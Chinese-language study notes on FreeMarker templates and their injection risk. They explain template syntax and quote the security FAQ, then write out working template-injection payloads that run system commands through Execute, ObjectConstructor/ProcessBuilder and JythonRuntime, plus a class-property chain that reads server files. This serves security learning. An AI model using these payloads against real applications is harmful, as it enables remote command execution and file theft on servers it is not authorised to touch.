### 模板

https://freemarker.apache.org/docs/dgui_template_exp.html

- 赋值
    `<#assign x = x + 1>`
- 使用
    `${ ... }`

- 打印序列
    ```java
    <#list .data_model?keys as ele>
    -- ${ele}
    </#list>
    ```

### 特殊变量

https://freemarker.apache.org/docs/ref_specvar.html
- namespace
- data_model
- globals

### 安全文档

https://freemarker.apache.org/docs/app_faq.html#faq_template_uploading_security

> 虽然 `new` 不会实例化不是 `TemplateModel` 的类，但 FreeMarker 包含一个可用于创建任意 Java 对象的 `TemplateModel` 类。其他“危险的” `TemplateModel` 可能存在于你的类路径中。此外，即使一个类没有实现 `TemplateModel`，它的静态初始化也将被执行。

### 类

- FreeMarker 的 `TemplateModel` 文档
    https://freemarker.apache.org/docs/api/freemarker/template/TemplateModel.html
    - `TemplateModel` 是类的接口，文档列出了所有实现此接口的类
        ```log
        All Known Implementing Classes:
            AllHttpScopesHashModel, AllHttpScopesHashModel, ArrayModel, BeanModel, BooleanModel, CaptureOutput, CollectionModel, CommonTemplateMarkupOutputModel, DateModel, DefaultArrayAdapter, DefaultEnumerationAdapter, DefaultIterableAdapter, DefaultIteratorAdapter, DefaultListAdapter, DefaultMapAdapter, DefaultNonListCollectionAdapter, DOMNodeModel, EnumerationModel, Environment.Namespace, Execute, GenericObjectModel, HtmlEscape, HttpRequestHashModel, HttpRequestHashModel, HttpRequestParametersHashModel, HttpRequestParametersHashModel, HttpSessionHashModel, HttpSessionHashModel, IncludePage, IncludePage, IteratorModel, JythonHashModel, JythonModel, JythonNumberModel, JythonRuntime, JythonSequenceModel, LocalizedString, MapModel, NodeListModel, NodeListModel, NodeModel, NormalizeNewlines, NumberModel, ObjectConstructor, OverloadedMethodsModel, ResourceBundleLocalizedString, ResourceBundleModel, RhinoFunctionModel, RhinoScriptableModel, ServletContextHashModel, ServletContextHashModel, SimpleCollection, SimpleDate, SimpleHash, SimpleList, SimpleMapModel, SimpleMethodModel, SimpleNumber, SimpleScalar, SimpleSequence, StandardCompress, StringModel, TaglibFactory, TaglibFactory, TemplateCombinedMarkupOutputModel, TemplateHTMLOutputModel, TemplateModelListSequence, TemplateRTFOutputModel, TemplateXHTMLOutputModel, TemplateXMLOutputModel, XmlEscape
            ```
    - 其中的代码/命令执行类
        - `Execute`
        - `ObjectConstructor`
        - `JythonRuntime`

- `Execute` 查阅文档
    https://freemarker.apache.org/docs/api/freemarker/template/utility/Execute.html
    - 示例
        ```java
        SimpleHash root = new SimpleHash();

        root.put( "exec", new freemarker.template.utility.Execute() );

        ${exec( "/usr/bin/ls" )}
        ```
        - 示例使用 `SimpleHash` 设置包装，略过以直接设置对象获取目标方法
    - 模板语法
        ```java
        // 赋值，获取方法对象
        <#assign exec="freemarker.template.utility.Execute"?new()>
        // 运算，调用方法
        ${exec( "/usr/bin/ls" )}
        ```
        或
        ```Java
        // 获取对象后立即调用
        ${"freemarker.template.utility.Execute"?new()("whoami")}
        ```

- `ObjectConstructor` 创建任意对象的包装
    - 示例
        ```java
        <#assign aList = objectConstructor("java.util.ArrayList", 100)>
        ```
    - 设置模板语法
        ```java
        <#assign objcs="freemarker.template.utility.ObjectConstructor"?new()>
        ${objcs("java.lang.ProcessBuilder", "id").start()}
        ```

- `JythonRuntime` java 内的 python 转换器
    - Interface TemplateTransformModel
        - Interface TemplateDirectiveModel
            - 使用方式，用作用户自定义指令
                ```java
                <@myDirective foo=1 bar="wombat">...</@myDirective>
                ```
                或
                ```java
                <@myDirective foo=1 bar="wombat" />
                ```
    - 设置模板语法
        ```java
        <#assign jprun="freemarker.template.utility.JythonRuntime"?new()>
        <@jprun>print("test")</@jprun>
        ```

- 类对象

    https://freemarker.apache.org/docs/pgui_misc_beanwrapper.html#beanswrapper_hash

    - freemarker 似乎实现了 java 中不存在的 `.class` 属性（java 仅存在 `getClass()`），遵循 
        > Every object will be wrapped into a TemplateHashModel that will expose JavaBeans properties and methods of the object. This way, you can use `model.foo` in the template to invoke `obj.getFoo()` or `obj.isFoo()` methods

    - 类对象的属性可用来读取文件
    
        ```freemarker
        ${product.class.getProtectionDomain().getCodeSource().getLocation().toURI().resolve('文件路径').toURL().openStream().readAllBytes()?join(" ")}
        ```